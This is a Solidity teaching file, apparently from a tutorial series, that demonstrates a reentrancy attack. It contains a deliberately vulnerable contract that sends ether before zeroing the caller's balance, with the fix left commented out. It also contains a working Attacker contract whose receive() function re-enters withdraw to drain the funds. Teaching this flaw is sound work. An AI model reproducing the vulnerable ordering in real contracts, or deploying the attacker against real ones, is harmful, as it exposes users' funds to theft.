// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

/**
 * https://github.com/AmazingAng/WTF-Solidity/blob/main/S01_ReentrancyAttack/readme.md
 * 重入攻击 
 * 转账过程中利用回退函数调用合约
 */

contract ReentrancyAttack {

   mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint bal = balances[msg.sender];
        require(bal > 0, "not enough balance");
        // balances[msg.sender] = 0; // 先更新状态
        // 转入 eth 有重入的风险 因为转账过程中会调用回退函数 回退函数中可以继续调用 withdraw 由于其顺序调用特性 永远不会继续向下执行
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "failed to send Ether");
        // 更新余额在后面
        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    // 防止重入攻击
    // modifier nonReentrant() {
    //     // 第一次调用时，将状态变量设置为 true
    //     require(!_nonReentrant, "ReentrancyGuard: reentrant call");
    //     _nonReentrant = true;
    //     // 函数执行完毕后，将状态变量设置为 false
    //     _;
    //     _nonReentrant = false;
    // }

    // bool private _nonReentrant;

}

contract Attacker {

    ReentrancyAttack public banker;

    constructor(address _addr) {
        banker = ReentrancyAttack(_addr);
    }

    // 低层方法 接收 eth 时调用 如果没有 receive 方法 会调用 fallback 方法
    receive() external payable {
        if (banker.getBalance() >= 1 ether)  {
            banker.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "");
        banker.deposit{value: 1 ether}();
        banker.withdraw();
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

}